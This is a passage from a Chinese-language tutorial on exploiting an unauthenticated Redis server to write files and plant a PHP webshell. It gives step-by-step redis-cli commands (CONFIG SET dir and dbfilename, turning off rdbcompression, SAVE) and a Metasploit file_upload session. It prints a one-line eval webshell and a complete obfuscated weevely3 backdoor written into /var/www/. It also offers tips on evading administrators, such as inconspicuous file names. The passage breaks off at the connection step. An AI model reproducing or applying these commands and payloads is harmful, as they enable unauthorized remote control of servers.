<p>这个目录，必须已存在且 redis 安装账号对其有写权限，否则将报错：</p>
</p>
<pre><code>(error) ERR Changing directory: Nosuch file or directory</code></pre>
</p>
<p>设置要写入的文件名：</p>
</p>
<pre><code><p>192.168.56.101:6379&gt; CONFIG SETdbfilename yourfile</p><p>OK</p></code></pre>
</p>
<p>这样，文件路径完整为 /tmp/yourfile。创建键为 yourkey、值为 yourvalue 的键/值对：</p>
</p>
<pre><code><p>192.168.56.101:6379&gt; SET YOURKEY"YOURVALUE"</p><p>OK</p></code></pre>
</p>
<p>将内存数据写入文件：</p>
<p>登录 192.168.56.101 查看刚写入的文件：</p>
<pre><code># cat /tmp/yourfile 
REDIS0008�&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; redis-ver4.0.1�
redis-bits�@�ctime�!��Yused-mem�
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; �
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; aof-preamble��repl-id(f673f43a842713fcfa179696f306c536f476e997�
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;repl-offset���##oldkeoldvalueyourkey&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; yourvalue�Z?#��
192.168.56.101:6379&gt; SAVE
OK<br /></code></pre>
<p>存在乱码，是因为 redis 以二进制模式写文件，二进制模式查看：</p>
</p>
<pre><code><p>$ xxd /tmp/yourfile</p><p>0000000: 5245 4449 5330 3030 38fa0972 6564 6973&nbsp; REDIS0008..redis</p><p>0000010: 2d76 6572 0534 2e30 2e31fa0a 7265 6469&nbsp; -ver.4.0.1..redi</p><p>0000020: 732d 6269 7473 c040 fa056374 696d 65c2&nbsp; s-bits.@..ctime.</p><p>0000030: 21c0 9a59 fa08 7573 65642d6d 656d c288&nbsp; !..Y..used-mem..</p><p>0000040: 9d0c 00fa 0c61 6f66 2d707265 616d 626c&nbsp; .....aof-preambl</p><p>0000050: 65c0 00fa 0772 6570 6c2d6964 2866 3637&nbsp; e....repl-id(f67</p><p>0000060: 3366 3433 6138 3432 37313366 6366 6131&nbsp; 3f43a842713fcfa1</p><p>0000070: 3739 3639 3666 3330 36633533 3666 3437&nbsp; 79696f306c536f47</p><p>0000080: 3665 3939 37fa 0b72 65706c2d 6f66 6673&nbsp; 6e997..repl-offs</p><p>0000090: 6574 c000 fe00 fb02 0000066f 6c64 6b65&nbsp; et.........<b>oldke</b></p><p>00000a0: 7908 6f6c 6476 616c 75650007 796f 7572&nbsp; <b>y</b>.<b>oldvalue</b>..<b>your</b></p><p>00000b0: 6b65 7909 796f 7572 76616c75 65ff 8e19&nbsp; <b>key</b>.<b>yourvalue</b>...</p><p>00000c0: 5a00 3f17 9be9 0a&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Z.?....</p></code></pre>
</p>
<p>从中可见三个关键点：一是，键和值均可作为待写入字符串的载体，如，yourkey、yourvalue；二是，redis 的内部关键信息也被写入文件，如，REDIS0008、redis-ver.4.0.1；三是，先前已存在的其他键/值也会保存到文件中，如，oldkey、oldvalue。</p>
<p>个人习惯将值作为写入字符串的载体。字符串应用双引号包裹；若字符串内部含有双引号、单引号等字符，那么应对其进行 \&#8221;、\&#8217; 转义；若要写入多行文本，应将多行合并成一行，用 \n 分割；另外，为防止待写入字符串与其他连接出现其他异常，最好在字符串前后加几个\n 或空格，将其隔离开：</p>
</p>
<pre><code><p>192.168.56.101:6379&gt; SET yourkey"\n\n i say \"hi\";\nu say \'hello\' \n\n"</p><p>OK</p></code></pre>
<p>redis写文件功能，目的不是单纯的将内存中的键/值保存到硬盘上，而是为了便于从文件中恢复数据，那么势必会将文件格式、关键属型、版本等等内部 redis 内部信息一并写入文件。站在攻击者角度，借助 redis 写的文件，必须具备一定容错性，否则，无法利用该漏洞。比如，将 PHP 语法之外的字符写入 tmp.php：</p>
</p>
<pre><code><p>aaaaaa bbbbbbbbbb</p><p>&lt;?php phpinfo(); ?&gt;</p><p>cccc dddddddddddd</p></code></pre>
</p>
<p>通过 URL 访问页面，可正常运行 PHP 代码，php 这类脚本文件就具有容错性，那么写 webshell 是可行的。</p>
<p>redis写文件功能，不仅保存你刚才新建的键/值，同时也会保存已有的其他键/值，所以，非你创建的键/值 oldkey/oldvalue 也被写入文件中。从攻击者视角来看，这会导致些问题。比如，你创建了存放一句话木马的键/值，希望保存至 webshell，如果有其他攻击者也创建了存放一句话木马的键/值，redis 在写文件时可能将他的一句话写在你的前面（即，他的一句话在 tmp.php 的第一行，你的在第二行），一旦他的一句话设置了需要密码才能访问，那么，你的一句话永远解析不了。为了规避这类问题，写文件前，一般先查看当前有哪些键：</p>
</p>
<pre><code><p>192.168.56.101:6379&gt; KEYS *</p><p>...</p><p>2) "resque:delayed:last_enqueued_at"</p><p>3) "phpspy"</p><p>4)"resque:stat:failed:mobby-db:26377:*"</p><p>...</p></code></pre>
</p>
<p>核实可疑键：</p>
</p>
<pre><code><p>192.168.56.101:6379&gt; GET"phpspy"</p><p>"&lt;?php@eval($_POST[value]);?&gt;"</p></code></pre>
</p>
<p>删除可疑键：</p>
</p>
<pre><code><p>192.168.56.101:6379&gt; DEL"phpspy"</p><p>(integer) 1</p></code></pre>
</p>
<p>如果逐一核实觉得麻烦，可以将键名定为 0，redis 按字符顺序写入文件，这样也可以将你的值写在文件的前面；甚至，不怕影响业务，还可以先用 FLUSHALL 清空所有键/值后再创建你的键/值，那么写入的文件肯定很干净了。&nbsp;</p>
<p>还有一件事，你应该知道，为了高效利用硬盘空间，redis 默认采用 LZF 压缩写入数据。如，创建键为 fours、值为44444444444444444444444444444444444444 的键/值：</p>
</p>
<pre><code><p>192.168.56.101:6379&gt; SET fours"44444444444444444444444444444444444444"</p><p>OK</p><p>192.168.56.101:6379&gt; GET fours</p><p>"44444444444444444444444444444444444444"</p><p>192.168.56.101:6379&gt; save</p><p>OK</p></code></pre>
</p>
<p>查看写入文件：</p>
</p>
<pre><code><p>$ xxd /tmp/test.txt</p><p>0000000: 5245 4449 5330 3030 38fa0972 6564 6973&nbsp; REDIS0008..redis</p><p>0000010: 2d76 6572 0534 2e30 2e31fa0a 7265 6469&nbsp; -ver.4.0.1..redi</p><p>0000020: 732d 6269 7473 c040 fa056374 696d 65c2&nbsp; s-bits.@..ctime.</p><p>0000030: 5a08 9d59 fa08 7573 65642d6d 656d c2d8&nbsp; Z..Y..used-mem..</p><p>0000040: 9c0c 00fa 0c61 6f66 2d707265 616d 626c&nbsp; .....aof-preambl</p><p>0000050: 65c0 00fa 0772 6570 6c2d6964 2838 3064&nbsp; e....repl-id(80d</p><p>0000060: 3166 3935 6562 6130 38333236 3433 3137&nbsp; 1f95eba083264317</p><p>0000070: 6461 3835 3338 6235 31643863 3235 3230&nbsp; da8538b51d8c2520</p><p>0000080: 3937 6365 38fa 0b72 65706c2d 6f66 6673&nbsp; 97ce8..repl-offs</p><p>0000090: 6574 c000 fe00 fb01 00000566 6f75 7273&nbsp; et.........fours</p><p>00000a0: c309 2601 3434 e019 00013434 ff0f ac63&nbsp; ..&amp;.<b>44....44</b>...c</p><p>00000b0: 03c6 35a9 00&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ..5..</p><p></p></code></pre>
<p>redis并未严格写入指定数目的 4 到文件中，这在写 webshell 这类场景中，一旦 PHP 代码被压缩，肯定无法正确解析，所以，通常应关闭压缩功能：</p>
</p>
<pre><code><p>192.168.56.101:6379&gt; CONFIG SETrdbcompression no</p><p>OK</p><p>192.168.56.101:6379&gt; SET fours"44444444444444444444444444444444444444"</p><p>OK</p><p>192.168.56.101:6379&gt; GET fours</p><p>"44444444444444444444444444444444444444"</p><p>192.168.56.101:6379&gt; save</p><p>OK</p></code></pre>
</p>
<p>查看写入文件，一切正常：</p>
</p>
<pre><code><p># xxd /var/www/test.txt</p><p>0000000: 5245 4449 5330 3030 38fa0972 6564 6973&nbsp; REDIS0008..redis</p><p>0000010: 2d76 6572 0534 2e30 2e31fa0a 7265 6469&nbsp; -ver.4.0.1..redi</p><p>0000020: 732d 6269 7473 c040 fa056374 696d 65c2&nbsp; s-bits.@..ctime.</p><p>0000030: 9b0a 9d59 fa08 7573 65642d6d 656d c268&nbsp; ...Y..used-mem.h</p><p>0000040: 9d0c 00fa 0c61 6f66 2d707265 616d 626c&nbsp; .....aof-preambl</p><p>0000050: 65c0 00fa 0772 6570 6c2d6964 2838 3064&nbsp; e....repl-id(80d</p><p>0000060: 3166 3935 6562 6130 38333236 3433 3137&nbsp; 1f95eba083264317</p><p>0000070: 6461 3835 3338 6235 31643863 3235 3230&nbsp; da8538b51d8c2520</p><p>0000080: 3937 6365 38fa 0b72 65706c2d 6f66 6673&nbsp; 97ce8..repl-offs</p><p>0000090: 6574 c000 fe00 fb01 00000566 6f75 7273&nbsp; et.........fours</p><p>00000a0: 2634 3434 3434 3434 34343434 3434 3434&nbsp; &amp;<b>444444444444444</b></p><p>00000b0: 3434 3434 3434 3434 34343434 3434 3434&nbsp; <b>4444444444444444</b></p><p>00000c0: 3434 3434 3434 34ff dd3f6b58 38a0 bd7f&nbsp; <b>4444444</b>..?kX8...</p></code></pre>
<p>如果觉得整个写文件过程手工操作太麻烦，可借助 MSF 实现自动化：</p>
</p>
<pre><code><p>msf &gt; useauxiliary/scanner/redis/file_upload</p><p>msf auxiliary(file_upload) &gt; showoptions<span style="background-color: transparent;">&nbsp;</span></p><p>Module options(auxiliary/scanner/redis/file_upload):</p><p>&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; CurrentSetting&nbsp; Required&nbsp; Description</p><p>&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------------&nbsp; --------&nbsp; -----------</p><p>&nbsp;&nbsp;DISABLE_RDBCOMPRESSION&nbsp; true&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Disable compression when saving if foundto be enabled</p><p>&nbsp;&nbsp;FLUSHALL &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;false&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Run flushall to remove all redis databefore saving</p><p>&nbsp;&nbsp;LocalFile&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Local file to beuploaded</p><p>&nbsp;&nbsp;PASSWORD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foobared&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Redis password for authentication test</p><p>&nbsp;&nbsp;RHOSTS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The target address rangeor CIDR identifier</p><p>&nbsp;&nbsp;RPORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 6379&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The target port (TCP)</p><p>&nbsp;&nbsp;RemoteFile&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Remote file path</p><p>&nbsp;&nbsp;THREADS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The number of concurrent threads</p></code></pre>
</p>
<p>其中多个选项的意义，前面已提及过，比如，DISABLE_RDBCOMPRESSION 表示是否关闭压缩功能，肯定是；RemoteFile写入的文件路径，不仅是目录还得含有文件名；FLUSHALL 是否先删除 redis 中其他已有键/值，最好选否，避免影响正常业务，你应手工查看，删除非业务的可疑键/值：</p>
</p>
<pre><code><p>msf auxiliary(file_upload) &gt; setDISABLE_RDBCOMPRESSION yes</p><p>DISABLE_RDBCOMPRESSION =&gt; true</p><p>msf auxiliary(file_upload) &gt; setRHOSTS 192.168.56.101</p><p>RHOSTS =&gt; 192.168.56.101</p><p>msf auxiliary(file_upload) &gt; setRemoteFile /tmp/yourfile2</p><p>RemoteFile =&gt; /tmp/yourfile2</p><p>msf auxiliary(file_upload) &gt; setLocalFile /home/yangyangwithgnu/test.txt</p><p>LocalFile =&gt;/home/yangyangwithgnu/test.txt</p><p>msf auxiliary(file_upload) &gt; run</p><p>[+] 192.168.56.101:6379 -192.168.56.101:6379 -- saved 15 bytes inside of redis DB at /tmp/yourfile2</p><p>[*] Scanned 1 of 1 hosts (100%complete)</p><p>[*] Auxiliary module executioncompleted</p></code></pre>
</p>
<p>查看写入文件：</p>
</p>
<pre><code><p># xxd /tmp/yourfile2</p><p>0000000: 5245 4449 5330 3030 38fa0972 6564 6973&nbsp; REDIS0008..redis</p><p>0000010: 2d76 6572 0534 2e30 2e31fa0a 7265 6469&nbsp; -ver.4.0.1..redi</p><p>0000020: 732d 6269 7473 c040 fa056374 696d 65c2&nbsp; s-bits.@..ctime.</p><p>0000030: 92ba 9e59 fa08 7573 65642d6d 656d c238&nbsp; ...Y..used-mem.8</p><p>0000040: f10c 00fa 0c61 6f66 2d707265 616d 626c&nbsp; .....aof-preambl</p><p>0000050: 65c0 00fa 0772 6570 6c2d6964 2838 3064&nbsp; e....repl-id(80d</p><p>0000060: 3166 3935 6562 6130 38333236 3433 3137&nbsp; 1f95eba083264317</p><p>0000070: 6461 3835 3338 6235 31643863 3235 3230&nbsp; da8538b51d8c2520</p><p>0000080: 3937 6365 38fa 0b72 65706c2d 6f66 6673&nbsp; 97ce8..repl-offs</p><p>0000090: 6574 c000 fe00 fb01 0000205a 696f 7470&nbsp; et........ Ziotp</p><p>00000a0: 6a49 4b5a 4870 6a56 784d4677 6959 4d6e&nbsp; jIKZHpjVxMFwiYMn</p><p>00000b0: 6e43 6f42 4f66 6662 526f720f 0a68 656c&nbsp; nCoBOffbRor..<b>hel</b></p><p>00000c0: 6c6f 2c20 776f 726c 64210aff b439 bb6c&nbsp; <b>lo, world!</b>...9.l</p><p>00000d0: 9aaa 9f29&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; …)</p></code></pre>
</p>
<p>为清晰说明细节，后面仍用采用手工操作方式。</p>
<h2><b>写 webshell 文件实现远程控制</b></h2>
<p>一旦控制 redis 后，优先想到的是写 webshell，容错性是它最大优势。假定目标是 PHP 环境、web 的根目录为/var/www/，按前面步骤尝试写个普通 PHP 脚本看下是否能成功解析：</p>
</p>
<pre><code><p>$ redis-cli -p 6379 -h 192.168.56.101</p><p>192.168.56.101:6379&gt; CONFIG SETdbfilename phpinfo.php</p><p>OK</p><p>192.168.56.101:6379&gt; CONFIG SETdir "/var/www/"</p><p>OK</p><p>192.168.56.101:6379&gt; CONFIG SETrdbcompression no</p><p>OK</p><p>192.168.56.101:6379&gt; SET phpinfo"\n\n &lt;?php phpinfo(); ?&gt; \n\n" NX</p><p>OK</p><p>192.168.56.101:6379&gt; save</p><p>OK</p></code></pre>
</p>
<p>访问 <a href="http://192.168.56.101/phpinfo.php">http://192.168.56.101/phpinfo.php</a>：</p>
<p style="text-align: center;"><img alt="1.png" data-original="http://image.3001.net/images/20170922/15060761085789.png!small" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif" width="690" height="363"><br />（解析 phpinfo）</p>
<noscript><img alt="1.png" src="http://image.3001.net/images/20170922/15060761085789.png!small" width="690" height="363"><br />（解析 phpinfo）</p></noscript>
<p>虽然页面顶部出现了些 redis 的内部信息，但后面也正常显示了 PHP 详情，说明解析成功。</p>
<p>这次写个 webshell。为了减少不定因素（WAF），不建议直接用 redis 写大马，你可以先写个一句话的小马，用小马拉大马，或者，写适配菜刀的小马，用菜刀访问，或者，写由 msfvenom 生成的小马，用 MSF 访问，或者，写由 weevely3 生成的小马，用 weevely3 访问（限 PHP 环境）。个人偏好 weevely3，以此为例。</p>
</p>
<pre><code><p>weevely3生成webshell：</p><p>$./weevely.py generate yourpasswd~/info.php</p><p>Generated backdoor with password'yourpasswd' in '/home/yangyangwithgnu/info.php' of 1486 byte size.</p></code></pre>
</p>
<p>其中，yourpasswd 为访问 webshell 的密码，另外，文件名切勿张扬，phpspy.php、agent.php 等等容易引起管理员注意。查看内容如下：</p>
</p>
<pre><code><p>$cat ~/info.php</p><p>&lt;?php</p><p>$o='&amp;l;&amp;lq=0.(&amp;l&amp;l[\\d]))?,?/&amp;l",$r&amp;l&amp;la,$m&amp;l);if($q&amp;l&amp;&amp;$m){@sess&amp;lion_sta&amp;lr&amp;lt();$s=&amp;$_S&amp;l';</p><p>$D='m&amp;ld5($&amp;li.$kh)&amp;l&amp;l,0&amp;l,3))&amp;l;$f=$sl($ss(md5($i&amp;l&amp;l.$kf),0,3));$&amp;lp="";fo&amp;lr&amp;l($z=1;$z&lt;cou';</p><p>$e='l["que&amp;lry"],$q)&amp;l;$q=ar&amp;lray&amp;l_v&amp;lalues($&amp;lq);preg_matc&amp;lh&amp;l_al&amp;ll("/([\\&amp;lw])[\\w-]+(?:';</p><p>$y='i}^&amp;l$k{$j};&amp;l}}return&amp;l$o&amp;l;}$&amp;lr=$_SERVER;$&amp;lrr=@$r["&amp;lHTTP_R&amp;lEFER&amp;lER"];$ra=&amp;l@$r&amp;';</p><p>$h='64&amp;l_dec&amp;lod&amp;le(preg_replace(&amp;la&amp;lrray("/_/","/-&amp;l/"),a&amp;lrr&amp;lay("/","+&amp;l"),$ss&amp;l&amp;l($&amp;ls[';</p><p>$s='l["HT&amp;lTP_ACC&amp;lEPT_LA&amp;lNGUAGE"];if&amp;l&amp;l($rr&amp;&amp;$ra&amp;l&amp;l){$u=parse_url(&amp;l&amp;l$rr);pa&amp;lrse_str($u&amp;';</p><p>$f='n&amp;l&amp;lt($m[1]);$&amp;lz++&amp;l)$p.=&amp;l$q[$m[2][$z]&amp;l];&amp;lif&amp;l(s&amp;ltrpos($p,$h)=&amp;l&amp;l==0){$s[$i]=""&amp;';</p><p>$P='$&amp;li],0,$e))),$k))&amp;l);$&amp;lo=ob_g&amp;let_conten&amp;lts();ob_&amp;lend_cle&amp;lan&amp;l();$d=base6&amp;l4_enc&amp;lod';</p><p>$R='e(x(&amp;lgzcompr&amp;le&amp;lss($o),$&amp;lk));&amp;lprint(&amp;l"&lt;$k&gt;$d&lt;/&amp;l$k&gt;")&amp;l&amp;l;@s&amp;lession_destroy();}}}}';</p><p>$Z='$kh&amp;l="aeb&amp;lb";$kf&amp;l="7a&amp;l7d";func&amp;ltion&amp;lx($t,$k){&amp;l$c=&amp;lstr&amp;llen($k);$l=strlen(&amp;l&amp;l$t);$';</p><p>$A='l;$&amp;lp=$ss($p,3);}&amp;lif(&amp;larra&amp;ly_ke&amp;ly_exi&amp;lsts($i,$s)){$&amp;ls[$i].=&amp;l$&amp;lp;$e=st&amp;lrp&amp;los($s';</p><p>$l='&amp;lESSION;$ss="s&amp;lubstr";$sl="str&amp;ltolowe&amp;lr";$i=$m&amp;l[1][0&amp;l].$m[1&amp;l][&amp;l1];$h=$sl($&amp;lss(';</p><p>$n='o="";&amp;lf&amp;lor($i=0;$i&lt;$l;&amp;l){for&amp;l(&amp;l$j=0;(&amp;l$j&lt;$c&amp;&amp;$i&amp;l&lt;$l);$j&amp;l++,$i&amp;l++){&amp;l&amp;l$o.=$t{$';</p><p>$V=str_replace('XZ','','crXZXZeate_XZXZXZfunXZction');</p><p>$w='[$i],$&amp;lf)&amp;l;if($e){$k&amp;l=$kh.$kf&amp;l;ob&amp;l_&amp;lstart();@ev&amp;lal(@gz&amp;lunc&amp;lompress(@&amp;lx(@bas&amp;le';</p><p>$q=str_replace('&amp;l','',$Z.$n.$y.$s.$e.$o.$l.$D.$f.$A.$w.$h.$P.$R);</p><p>$G=$V('',$q);$G();</p><p>?&gt;</p><p></p></code></pre>
<p>内容不太像普通 PHP 代码，这就对了，weevely3 为了免杀特意进行了代码混淆。</p>
<p>前面提过，redis 写文件的几个注意事项：以键值作为写入字符串的载体、字符串应用双引号包裹、引号须转义、多行应合并成 \n 分割的单行、待写入字符串前后加 \n 将其隔、删除其他可疑键/值、关闭写文件压缩功能。</p>
<p>&nbsp;调整后的待写入内容、确认无其他可疑键/值后，写入 webshell：</p>
</p>
<pre><code><p>192.168.56.101:6379&gt; CONFIG SETdbfilename info.php</p><p>OK</p><p>192.168.56.101:6379&gt; CONFIG SETdir "/var/www/"</p><p>OK</p><p>192.168.56.101:6379&gt; CONFIG SETrdbcompression no</p><p>OK</p></code></pre>
</p>
<pre><code><p>192.168.56.101:6379&gt; SET info"\n\n &lt;?php\n$o=\'&amp;l;&amp;lq=0.(&amp;l&amp;l[\\d]))?,?/&amp;l\",$r&amp;l&amp;la,$m&amp;l);if($q&amp;l&amp;&amp;$m){@sess&amp;lion_sta&amp;lr&amp;lt();$s=&amp;$_S&amp;l\';\n$D=\'m&amp;ld5($&amp;li.$kh)&amp;l&amp;l,0&amp;l,3))&amp;l;$f=$sl($ss(md5($i&amp;l&amp;l.$kf),0,3));$&amp;lp=\"\";fo&amp;lr&amp;l($z=1;$z&lt;cou\';\n$e=\'l[\"que&amp;lry\"],$q)&amp;l;$q=ar&amp;lray&amp;l_v&amp;lalues($&amp;lq);preg_matc&amp;lh&amp;l_al&amp;ll(\"/([\\&amp;lw])[\\w-]+(?:\';\n$y=\'i}^&amp;l$k{$j};&amp;l}}return&amp;l$o&amp;l;}$&amp;lr=$_SERVER;$&amp;lrr=@$r[\"&amp;lHTTP_R&amp;lEFER&amp;lER\"];$ra=&amp;l@$r&amp;\';\n$h=\'64&amp;l_dec&amp;lod&amp;le(preg_replace(&amp;la&amp;lrray(\"/_/\",\"/-&amp;l/\"),a&amp;lrr&amp;lay(\"/\",\"+&amp;l\"),$ss&amp;l&amp;l($&amp;ls[\';\n$s=\'l[\"HT&amp;lTP_ACC&amp;lEPT_LA&amp;lNGUAGE\"];if&amp;l&amp;l($rr&amp;&amp;$ra&amp;l&amp;l){$u=parse_url(&amp;l&amp;l$rr);pa&amp;lrse_str($u&amp;\';\n$f=\'n&amp;l&amp;lt($m[1]);$&amp;lz++&amp;l)$p.=&amp;l$q[$m[2][$z]&amp;l];&amp;lif&amp;l(s&amp;ltrpos($p,$h)=&amp;l&amp;l==0){$s[$i]=\"\"&amp;\';\n$P=\'$&amp;li],0,$e))),$k))&amp;l);$&amp;lo=ob_g&amp;let_conten&amp;lts();ob_&amp;lend_cle&amp;lan&amp;l();$d=base6&amp;l4_enc&amp;lod\';\n$R=\'e(x(&amp;lgzcompr&amp;le&amp;lss($o),$&amp;lk));&amp;lprint(&amp;l\"&lt;$k&gt;$d&lt;/&amp;l$k&gt;\")&amp;l&amp;l;@s&amp;lession_destroy();}}}}\';\n$Z=\'$kh&amp;l=\"aeb&amp;lb\";$kf&amp;l=\"7a&amp;l7d\";func&amp;ltion&amp;lx($t,$k){&amp;l$c=&amp;lstr&amp;llen($k);$l=strlen(&amp;l&amp;l$t);$\';\n$A=\'l;$&amp;lp=$ss($p,3);}&amp;lif(&amp;larra&amp;ly_ke&amp;ly_exi&amp;lsts($i,$s)){$&amp;ls[$i].=&amp;l$&amp;lp;$e=st&amp;lrp&amp;los($s\';\n$l=\'&amp;lESSION;$ss=\"s&amp;lubstr\";$sl=\"str&amp;ltolowe&amp;lr\";$i=$m&amp;l[1][0&amp;l].$m[1&amp;l][&amp;l1];$h=$sl($&amp;lss(\';\n$n=\'o=\"\";&amp;lf&amp;lor($i=0;$i&lt;$l;&amp;l){for&amp;l(&amp;l$j=0;(&amp;l$j&lt;$c&amp;&amp;$i&amp;l&lt;$l);$j&amp;l++,$i&amp;l++){&amp;l&amp;l$o.=$t{$\';\n$V=str_replace(\'XZ\',\'\',\'crXZXZeate_XZXZXZfunXZction\');\n$w=\'[$i],$&amp;lf)&amp;l;if($e){$k&amp;l=$kh.$kf&amp;l;ob&amp;l_&amp;lstart();@ev&amp;lal(@gz&amp;lunc&amp;lompress(@&amp;lx(@bas&amp;le\';\n$q=str_replace(\'&amp;l\',\'\',$Z.$n.$y.$s.$e.$o.$l.$D.$f.$A.$w.$h.$P.$R);\n$G=$V(\'\',$q);$G();\n ?&gt; \n\n" NX</p><p>OK</p><p>192.168.56.101:6379&gt; save</p><p>OK</p></code></pre>
</p>
<p>其中，命令末的 nx，表示仅当键 info 不存在时才创建，防止误更新到业务在用的键名，引起业务异常。</p>
<p>浏览器访问 <a href="http://192.168.56.101/info.php">http://192.168.56.101/info.php</a> 无报错，确认 webshell 解析成功。用 weevely3 连接：</p>
</p>
